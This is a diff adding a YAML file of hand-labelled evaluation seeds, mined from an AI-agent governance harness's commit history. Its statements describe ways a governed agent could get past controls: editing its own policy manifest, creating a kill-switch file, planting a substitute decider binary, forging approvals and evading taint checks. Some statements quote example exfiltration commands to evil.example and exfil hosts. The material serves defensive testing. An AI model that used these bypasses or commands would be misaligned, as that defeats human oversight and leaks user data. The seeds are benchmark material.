@@ -1,0 +1,530 @@
+# Hand-curated labels for eval cases mined from sv-pro/ai2rules history.
+#
+# One seed = one historical commit (or one slice of it, via `tests`/`paths`).
+# eval/build_sets.py derives everything else from git: base and fix revisions,
+# fail-to-pass test names, the write partition, seeded-defect hunks for review,
+# SZZ-introducing commits, and the dev/holdout split.
+#
+# What a human wrote here, and only here:
+#   statement  — the task as an issue would state it: the observable problem or the
+#                goal, NOT the fix. Written from the commit message and diff with the
+#                solution removed (09 §3.9: strip solution hints). For the epics, the
+#                statement is PLAN.md at the base revision (statement_ref).
+#   finding    — what a reviewer should flag if shown the defective code (review
+#                seeds only). The expected location comes from the diff, not from here.
+#   task_class / defect_class / consequence — the slice labels.
+#
+# Status: every case built from this file is a CANDIDATE (CLAUDE.md: candidates until an
+# independent process admits them). Labels were written by Claude from commit history
+# on 2026-09-26 and have not been reviewed by the owner.
+#
+# task_class:   security_fix | bugfix | feature
+# defect_class: fail_open | policy_bypass | integrity | path_confinement |
+#               untrusted_relay | taint_loss | secret_exposure | protocol_loss |
+#               concurrency | misdiagnosis | portability | under_coverage
+# consequence:  governed (touches authz/taint/approvals/sandbox/supply chain — 09 §3.0
+#               overrides) | standard
+
+repo: sv-pro/ai2rules
+seeds:
+  # --- The D78–D80 fix, split by gap (17 §7) -----------------------------------
+  - id: a2r-g8-log-chain
+    commit: f85d511
+    tests: ["crates/trace-store/"]
+    paths: ["crates/trace-store/"]
+    task_class: security_fix
+    defect_class: integrity
+    consequence: governed
+    statement: >-
+      The approval log and the staged-commit log sign every line, but deleting a
+      whole signed line goes unnoticed: removing the `Consumed` line makes a
+      single-use approval usable again, and removing `AttemptStarted` /
+      `AttemptFinished` releases an idempotency key. Every remaining line still
+      verifies. A store must refuse a log with lines missing from the middle or
+      the end.
+    finding: >-
+      Per-line MACs don't bind a line to its position. Deleting, reordering or
+      truncating signed lines is undetectable, so a consumed grant or an
+      idempotency reservation can be erased.
+  - id: a2r-g1-hidden-base
+    commit: f85d511
+    tests: ["crates/compiler/", "a_hidden_backing_action", "the_scoped_verb_over_a_hidden_base"]
+    paths: ["crates/compiler/", "crates/harness-types/"]
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      A scoped capability such as `open_change_pr` pins `repo` to a literal, but
+      the base action it is built on (`create_pull_request`) is still projected,
+      so the model can call the base directly with any `repo`. Manifest authors
+      need a way to keep a base action for scoped verbs to build on while making
+      a direct call to it ABSENT.
+    finding: >-
+      The scoped verb's literal can be bypassed. The unscoped base action stays
+      projected and callable with arbitrary arguments.
+  - id: a2r-g2-effective-call
+    commit: f85d511
+    tests: ["crates/world-kernel/", "effective", "mcp_gateway_scoped"]
+    paths: ["crates/world-kernel/", "crates/harness-preview/", "crates/cli-harness/"]
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      `harness gate` decides on the proposed call but returns nothing about what
+      to execute, and `mcp-gateway` forwards the caller's own tool name and
+      arguments. For a scoped capability, the literals are never applied and the
+      locked arguments the caller smuggled in reach the upstream on ALLOW.
+    finding: >-
+      The gateway executes the proposal instead of the lowered call. The scoped
+      capability's literal injection and argument stripping never reach the
+      upstream.
+
+  # --- Security fixes ----------------------------------------------------------
+  - id: a2r-approval-log-signing
+    commit: a9cf449
+    task_class: security_fix
+    defect_class: integrity
+    consequence: governed
+    statement: >-
+      The approval store is plain append-only JSONL. Anything that can write the
+      file can append a token already in the `Approved` state, and load accepts
+      it. An approval is also bound to `world_id` only, so it survives a rewrite
+      of the world's policy under the same id.
+    finding: >-
+      Approval records are unauthenticated: write access to the log forges a
+      human approval. Approvals also aren't bound to the compiled manifest, so
+      they outlive a policy change.
+  - id: a2r-secrets-in-values
+    commit: 2493757
+    task_class: security_fix
+    defect_class: secret_exposure
+    consequence: governed
+    statement: >-
+      Trace redaction matches field keys and paths only. A bearer token inside a
+      `command`, an `api_key` in a URL query, a password in a clone URL or an
+      echoed private key are written to the trace in clear. Masking whole
+      command values is not acceptable, because the trace must stay readable.
+    finding: >-
+      Redaction keys on field names, so secrets embedded in ordinary string
+      values (commands, URLs) are persisted to traces unmasked.
+  - id: a2r-web-egress-and-kill
+    commit: e519f41
+    task_class: security_fix
+    defect_class: fail_open
+    consequence: governed
+    statement: >-
+      Three executor gaps. The web handler fetches even when the spec carries
+      `NetworkPolicy::Disabled`, and its host check can be fooled by userinfo
+      (`https://allowed@evil/`). A command timeout kills only the direct child,
+      so grandchildren keep running. A path that should require the human gate
+      can run without it.
+    finding: >-
+      The web handler ignores the spec's network policy, and its host matching is
+      bypassable via userinfo. The timeout kill leaves descendants alive.
+  - id: a2r-budgets-bind
+    commit: a030c8a
+    task_class: security_fix
+    defect_class: fail_open
+    consequence: governed
+    statement: >-
+      Manifest budgets (`max_commands_per_task`, `max_network_calls`,
+      `max_file_writes`, `max_tokens_per_session`) never trigger: every decision
+      is evaluated as if it were the session's first call, in the gate, the hook
+      adapters and the orchestrator.
+    finding: >-
+      Budget usage is constructed fresh per decision, so budgets are decorative
+      and never bind.
+  - id: a2r-class-first-match
+    commit: eee680a
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      Command classification returns the first class whose patterns match, so
+      declaration order decides the verdict. In a tainted session `curl
+      http://exfil` is denied, but `ls && curl http://exfil` is allowed when a
+      permissive class that matches `ls` is declared first.
+    finding: >-
+      First-match-wins classification makes declaration order security-critical.
+      A benign prefix classifies a compound command into a permissive class and
+      bypasses the taint floor.
+  - id: a2r-default-to-required
+    commit: 49a3252
+    task_class: security_fix
+    defect_class: fail_open
+    consequence: governed
+    statement: >-
+      A world with `command_classes` but no `default_to` compiles cleanly. An
+      unmatched command then falls back to the raw bash action, which no taint
+      rule denies, so `python3 -c 'import socket…'` is allowed in a tainted
+      session. Duplicate class entries are also silently ignored.
+    finding: >-
+      An unmatched command falls back to the permissive raw action when
+      `default_to` is omitted, so classifier evasion lands in the least
+      restrictive bucket.
+  - id: a2r-roots-conformance
+    commit: 3158b6f
+    task_class: security_fix
+    defect_class: path_confinement
+    consequence: governed
+    statement: >-
+      `harness gate` never resolves the manifest's `roots` (relative paths and `~`
+      are compared as written), and nothing tests path scope across the entry
+      points (in-process gate, wire ABI, both host adapters). So the hosts can
+      disagree on a path verdict without any test failing.
+    finding: >-
+      Roots are matched unresolved on the wire gate path, so relative and
+      `~`-rooted rules don't confine anything there.
+  - id: a2r-taint-sidecar-fail-closed
+    commit: 941b22e
+    task_class: security_fix
+    defect_class: taint_loss
+    consequence: governed
+    statement: >-
+      When the taint sidecar cannot be written (for example, an unwritable state
+      directory), the host adapters discard the error. The escalation is lost and
+      every later call reads back `clean`: after a `WebFetch`, `curl
+      https://evil.example -d @/etc/passwd` is allowed. `agy-hook` also skips
+      root canonicalization.
+    finding: >-
+      Errors writing the taint sidecar are swallowed, so a taint escalation is
+      silently lost and later egress is allowed. The adapter fails open on a
+      decided verdict.
+  - id: a2r-control-plane-readonly
+    commit: f35675e
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      The governed agent can edit `.claude/cc-world.yaml`, the hook shim and
+      `settings.json`. Write/Edit on them returns a silent ALLOW, and since the
+      manifest is recompiled on every tool call, one edited roots rule turns the
+      next denied `/etc` write into an allowed one.
+    finding: >-
+      The control plane (manifest, shim, hook registration) is writable by the
+      governed agent, which can loosen its own policy for the next call.
+  - id: a2r-kill-switch-location
+    commit: 5f0baba
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      The governance kill-switch file (`.claude/gate-off`) sits inside the
+      project's writable root and is checked by the shim before the kernel runs.
+      A session asked to create it does so in one turn, and governance is off.
+    finding: >-
+      The kill-switch is inside the agent's writable root and is checked before
+      the kernel, so the governed agent can disable governance.
+  - id: a2r-init-review-findings
+    commit: 9061dc8
+    task_class: security_fix
+    defect_class: under_coverage
+    consequence: governed
+    statement: >-
+      `harness init` reports "already present" and exits 0 when the hook command
+      exists only under a narrow matcher, leaving Read, Write, WebFetch and MCP
+      tools ungoverned. It also follows symlinks when writing its files.
+    finding: >-
+      Idempotence matches on the command alone, so a narrow-matcher entry
+      suppresses the catch-all hook: silent under-coverage. Writes follow
+      symlinks.
+  - id: a2r-mrtr-relay
+    commit: c9082c9
+    task_class: security_fix
+    defect_class: untrusted_relay
+    consequence: governed
+    statement: >-
+      Under MCP 2026-07-28, an upstream can answer `tools/call` with an
+      `input_required` result that demands an elicitation or LLM completion.
+      `mcp-gateway` relays that demand to the client verbatim (for example, a
+      prompt asking for an Atlassian API token), after the kernel has already
+      said ALLOW.
+    finding: >-
+      The gateway relays server-authored input demands to the client after
+      ALLOW. Untrusted instructions pass through a channel no verdict covers.
+  - id: a2r-world-owned-schemas
+    commit: 64c3d99
+    task_class: security_fix
+    defect_class: untrusted_relay
+    consequence: governed
+    statement: >-
+      `mcp-gateway` filters the upstream's `tools/list` by name and republishes
+      each surviving tool verbatim, including its `inputSchema`. A drifted or
+      malicious upstream can add an argument (such as `deleteAll` on
+      `jira_get_issue`) that the model is then offered.
+    finding: >-
+      Tool schemas come from the upstream rather than the world. Name-level
+      authorization with schema-level trust lets an upstream bolt arguments onto
+      allowed tools.
+  - id: a2r-mcp-read-taints
+    commit: 823cd11
+    task_class: security_fix
+    defect_class: taint_loss
+    consequence: governed
+    statement: >-
+      After `jira_get_issue` returns upstream content, the session is still
+      clean, so a following `jira_add_comment` passes the taint floor and reaches
+      the upstream. The demo worlds declare remote MCP reads as `side_effect:
+      Read`, the same as a local file read.
+    finding: >-
+      Remote MCP reads don't taint the session, so upstream content can drive the
+      next external write past the taint floor.
+  - id: a2r-sandbox-fail-closed
+    commit: cfd297a
+    task_class: security_fix
+    defect_class: fail_open
+    consequence: governed
+    statement: >-
+      `CommandHandler` spawns subprocesses that ignore the execution spec's
+      network and filesystem policy: a child can open sockets or write outside
+      the writable roots. No OS sandbox exists yet, and nothing tells the caller
+      the policy is not enforced.
+    finding: >-
+      Commands execute unconfined while the spec claims network and filesystem
+      policy. By default the handler fails open rather than requiring an explicit
+      unconfined opt-in.
+  - id: a2r-dangling-symlink
+    commit: 4edaf22
+    task_class: security_fix
+    defect_class: path_confinement
+    consequence: governed
+    statement: >-
+      A dangling symlink inside a writable root, whose target lies outside the
+      root and doesn't exist, passes the writable-root guard as an in-root new
+      file. The write then follows the link and creates the file outside the root.
+    finding: >-
+      The canonicalize failure falls through to the parent fallback, which
+      re-attaches a symlink leaf, so a dangling symlink escapes the writable root.
+  - id: a2r-hook-root-canonicalize
+    commit: c6eb8a8
+    task_class: security_fix
+    defect_class: path_confinement
+    consequence: governed
+    statement: >-
+      In `cc-hook --grant` mode, a write through a symlink inside the project that
+      points into a denied root is allowed, because paths are checked as given.
+      Creating a new file under a real project directory must still be allowed.
+    finding: >-
+      The hook checks the literal path, not the canonical one, so a project
+      symlink into a denied root bypasses path scope.
+  - id: a2r-shim-resolution
+    commit: 8882072
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      The hook shims (bash, python, OpenCode plugin) look for the `harness` binary
+      in the project's own `target/` directories, which the governed agent can
+      write. A binary planted there decides for the kernel.
+    finding: >-
+      The shim resolves the governance binary from an agent-writable location, so
+      the agent can substitute its own decider.
+  - id: a2r-spec-arg-sealing
+    commit: e2bd965
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      Arguments not declared in an action's schema are accepted. A `run_command`
+      call can carry a hidden `argv`, and `apply_patch` can carry
+      execution fields the descriptor never declared, which local handlers then
+      read.
+    finding: >-
+      Schemas are open by default and handlers read undeclared fields, so a
+      caller can smuggle execution parameters past the descriptor.
+  - id: a2r-unmatched-shell
+    commit: b3e3b0f
+    task_class: security_fix
+    defect_class: fail_open
+    consequence: governed
+    statement: >-
+      In the default world and `.claude/cc-world.yaml`, a shell command that no
+      class matches is decided as plain `run_command`, so shell bypasses of the
+      egress patterns are allowed in a tainted session.
+    finding: >-
+      Unclassified shell commands are treated as the permissive base action
+      instead of a fail-closed bucket.
+  - id: a2r-source-channel-policy
+    commit: b8bd844
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      Channels declared in the manifest do not control trust or taint: the gate
+      uses built-in channel semantics whatever the manifest says. Unknown or
+      duplicate channel names are also accepted.
+    finding: >-
+      The manifest's channel policy is ignored in favour of hardcoded trust, and
+      channel names aren't validated.
+  - id: a2r-incomplete-context
+    commit: 9058b5d
+    task_class: security_fix
+    defect_class: fail_open
+    consequence: governed
+    statement: >-
+      A GateRequest with a missing or malformed `context` (no `taint`, an unknown
+      taint value, no `source_channel`) is decided with defaults that are clean
+      and trusted.
+    finding: >-
+      Missing or malformed context fields default to the most permissive values.
+      The gate fails open on incomplete input.
+  - id: a2r-forged-approval-token
+    commit: a5908a8
+    task_class: security_fix
+    defect_class: integrity
+    consequence: governed
+    statement: >-
+      `harness gate` accepts an approval token supplied in the request and treats
+      the call as approved, so any caller can skip ASK by sending a token.
+    finding: >-
+      The gate trusts a request-supplied approval token, so approval can be
+      self-asserted by the caller.
+  - id: a2r-source-channel-declared
+    commit: 71b2c58
+    task_class: security_fix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      Both live host adapters hardcode `source_channel: "user_prompt"`, the most
+      trusted channel, for every call, including one the model proposed right
+      after reading a poisoned file. Neither host's event says who proposed the
+      call.
+    finding: >-
+      A hardcoded most-trusted source channel upgrades every model proposal to
+      user-prompt trust.
+  - id: a2r-word-boundary-classify
+    commit: dcc4d18
+    task_class: bugfix
+    defect_class: policy_bypass
+    consequence: governed
+    statement: >-
+      The Bash classifier in `cc_hook.rs` and the OpenCode plugin match patterns
+      as substrings: `jsonc`, `sync`, `mycurl` and `warm -rf` are classified as
+      egress or destructive.
+    finding: >-
+      Substring matching misclassifies commands. Patterns need a left word
+      boundary, and the copies of the classifier disagree.
+  - id: a2r-installer-hook-merge
+    commit: 3649fa4
+    task_class: security_fix
+    defect_class: under_coverage
+    consequence: governed
+    statement: >-
+      `install-governance.sh` skips adding the PreToolUse hook whenever any
+      existing hook command contains the text `world-gate`, so a look-alike or
+      narrow-matcher entry leaves the project ungoverned while the install
+      reports success.
+    finding: >-
+      Idempotence is a substring test on the command, so any look-alike entry
+      suppresses the real hook.
+
+  # --- Bug fixes -----------------------------------------------------------------
+  - id: a2r-old-log-misdiagnosis
+    commit: 355c857
+    task_class: bugfix
+    defect_class: misdiagnosis
+    consequence: standard
+    statement: >-
+      An approval log written by 0.4.1 is refused with "the log has been modified
+      by something without the key", which sends the operator hunting for an
+      intruder when the cause is an upgrade. The refusal is right, but the
+      message is wrong.
+    finding: >-
+      An old-format record is reported as tampering. The error doesn't
+      distinguish a version mismatch from forgery.
+  - id: a2r-lock-contention
+    commit: 5c890f8
+    task_class: bugfix
+    defect_class: concurrency
+    consequence: standard
+    statement: >-
+      Acquiring the authorization-store lock while another thread holds it
+      briefly fails with "lock is busy" almost immediately, instead of waiting a
+      bounded time for the owner to release it.
+    finding: >-
+      The lock retry is a bounded count of `yield_now` spins, not a time bound, so
+      it gives up in microseconds under ordinary contention.
+  - id: a2r-alias-rename
+    commit: d771cdd
+    task_class: bugfix
+    defect_class: portability
+    consequence: standard
+    statement: >-
+      On Antigravity, any action with a `schema` returns `schema_violation`,
+      however well-formed the call, because the adapter adds the neutral argument
+      key alongside the host's PascalCase key.
+    finding: >-
+      Aliasing adds a second key instead of renaming, which violates closed
+      schemas on one host only.
+  - id: a2r-hook-cross-host
+    commit: f3cc56b
+    task_class: bugfix
+    defect_class: portability
+    consequence: standard
+    statement: >-
+      On Windows, GitHub Copilot runs the `.claude/settings.json` hook through
+      PowerShell from cwd `/` without `$CLAUDE_PROJECT_DIR`. The generated hook
+      command fails there, and Copilot then blocks every tool call.
+    finding: >-
+      The hook command depends on an env var, a relative path and double quotes,
+      and breaks under PowerShell from `/`.
+  - id: a2r-proxy-drops-fields
+    commit: cbd9541
+    task_class: bugfix
+    defect_class: protocol_loss
+    consequence: standard
+    statement: >-
+      `mcp-gateway` rebuilds `tools/list` as `{"tools": [...]}`, dropping sibling
+      fields such as `_meta`, `ttlMs` and `cacheScope`, and forwards
+      `tools/call` with only `name` and `arguments`, dropping `params._meta`.
+    finding: >-
+      The proxy discards protocol fields it doesn't model (result siblings and
+      `params._meta`).
+
+  # --- Features (implementation only; no review positive) ------------------------
+  - { id: a2r-feat-doctor-skeleton,  commit: b528dfe, task_class: feature, consequence: standard,
+      statement: "Add `harness doctor [--json]`: a static inspection of the Claude Code installation with the v0alpha3 JSON contract, status reduction to exit codes 0/1/2/3, and an honest `unknown` result until collectors exist (issue #84)." }
+  - { id: a2r-feat-doctor-collector, commit: ca5f85b, task_class: feature, consequence: standard,
+      statement: "Implement the read-only filesystem/environment collector for `harness doctor` (issue #85): hook registrations in .claude/settings.json, shim recognition, binary resolution incl. symlink chains, kill switches, interpreter availability, bounded reads, stable finding codes." }
+  - { id: a2r-feat-first-proof-demo, commit: 9972754, task_class: feature, consequence: standard,
+      statement: "Add a one-command, deterministic first-proof demo (`harness demo`) that a new user can run after install to see the kernel allow, deny and ask." }
+  - { id: a2r-feat-authz-instance,   commit: 14a986e, task_class: feature, consequence: governed,
+      statement: "Add a durable, effect-bound AuthorizationInstance for ASK: bound to principal, effect, resource, epoch and expiry; consumed atomically once before execution; signed rejection evidence; fail-closed after restart (issue #61)." }
+  - { id: a2r-feat-staged-effect,    commit: 4a2c363, task_class: feature, consequence: governed,
+      statement: "Prototype StagedEffect with an independent external commit: sealed non-effective staged artifacts, commit-time revalidation of world, schema and authorization, a durable idempotency reservation, and a finality receipt (issue #63)." }
+  - { id: a2r-feat-deepseek,         commit: 1a60659, task_class: feature, consequence: governed,
+      statement: "Govern DeepSeek Harness discovery and invocation: a host-neutral discovery projection ABI wired into prompt assembly, with invocation checks that still bind after revocation (issue #55)." }
+  - { id: a2r-feat-bench-guarantees, commit: 14ebf10, task_class: bugfix, consequence: standard,
+      statement: "The governance benchmark's oracle never reads `evidence`: a target answering `{}` everywhere passes all three scenarios, against the rule that PASS needs decision, effect count and evidence. The contrast guarantee is also only asserted in prose." }
+  - { id: a2r-feat-init,             commit: 051b420, task_class: feature, consequence: governed,
+      statement: "Add `harness init`: govern a project with nothing but the binary, with no checkout, no jq and no install step. Refuse to write a manifest that doesn't compile." }
+  - { id: a2r-feat-roots,            commit: 93f46b6, task_class: feature, consequence: governed,
+      statement: "The kernel is path-blind: Read /etc/shadow is granted like Read ./README. Add manifest `roots` so file actions can be decided by where they land. Path scope may only tighten an ALLOW." }
+  - { id: a2r-feat-grant-mode,       commit: fa834e5, task_class: feature, consequence: governed,
+      statement: "Add `cc-hook --grant`: on ALLOW, emit an explicit allow so the manifest can replace Claude Code's permission lists. The taint floor must still deny in this mode." }
+  - { id: a2r-feat-atlassian-skin,   commit: 48386cc, task_class: feature, consequence: standard,
+      statement: "Verify the real-Atlassian world (Rovo tool names) offline: a mock upstream advertising the genuine names, with end-to-end tests that the gateway exposes exactly the intended surface." }
+  - { id: a2r-feat-pact-l2,          commit: 977330c, task_class: feature, consequence: governed,
+      statement: "Turn the tool-level taint floor into an argument-role floor: taint only authority-bearing arguments, so a tainted session can still call a tool whose target came from the user. No LLM classifier." }
+  - { id: a2r-feat-mcp-gateway,      commit: 5459d81, task_class: feature, consequence: governed,
+      statement: "Add `harness mcp-gateway`: a governed stdio MCP server that projects the upstream's tools through the world, gates every call, forwards only ALLOW, and keeps monotonic session taint and an audit log." }
+  - { id: a2r-feat-cc-hook,          commit: ee44376, task_class: feature, consequence: governed,
+      statement: "Port the Claude Code PreToolUse adapter to Rust (`harness cc-hook`), calling gate() in-process: Bash classification, per-session taint sidecar, deny/ask output." }
+  - { id: a2r-feat-wasm-spike,       commit: 4ec1890, task_class: feature, consequence: standard,
+      statement: "Run the real compiler and kernel in the browser: extract a shared preview crate and a wasm-bindgen crate exposing preview(), default_world() and version()." }
+  - { id: a2r-epic-e1, commit: 39d0182, task_class: feature, consequence: governed, statement_ref: "PLAN.md#E1" }
+  - { id: a2r-epic-e2, commit: ffb21e1, task_class: feature, consequence: governed, statement_ref: "PLAN.md#E2" }
+  - { id: a2r-epic-e3, commit: d58f623, task_class: feature, consequence: governed, statement_ref: "PLAN.md#E3" }
+  - { id: a2r-epic-e4, commit: "5099275", task_class: feature, consequence: governed, statement_ref: "PLAN.md#E4" }
+  - { id: a2r-epic-e5, commit: 6134d58, task_class: feature, consequence: standard, statement_ref: "PLAN.md#E5" }
+  - { id: a2r-epic-e6, commit: b999c1e, task_class: feature, consequence: governed, statement_ref: "PLAN.md#E6" }
+  - { id: a2r-epic-e7, commit: 1a866dd, task_class: feature, consequence: governed, statement_ref: "PLAN.md#E7" }
+  - { id: a2r-feat-feedback-context, commit: 3660c16, task_class: feature, consequence: standard,
+      statement: "Expose governance results (verdict, rule, reason) to the model's context pack, so the next turn can see why a call was refused." }
+  - { id: a2r-feat-feedback-turns,   commit: c90e23c, task_class: feature, consequence: standard,
+      statement: "Feed governance outcomes into the next model turn in agent-core without requiring an observer, so a refused call leads to a replan rather than a retry." }
+
+# Commits whose diff is a clean control for review precision: no finding expected
+# beyond nits. Fix diffs of the security seeds above are added automatically as
+# negatives (the corrected code), unless SZZ implicates them in a later fix.
+clean_controls: [3eb40a6, 0bbc12d, a15baf3, 5a4e38e, 56b99d7, 5d0f0f0]
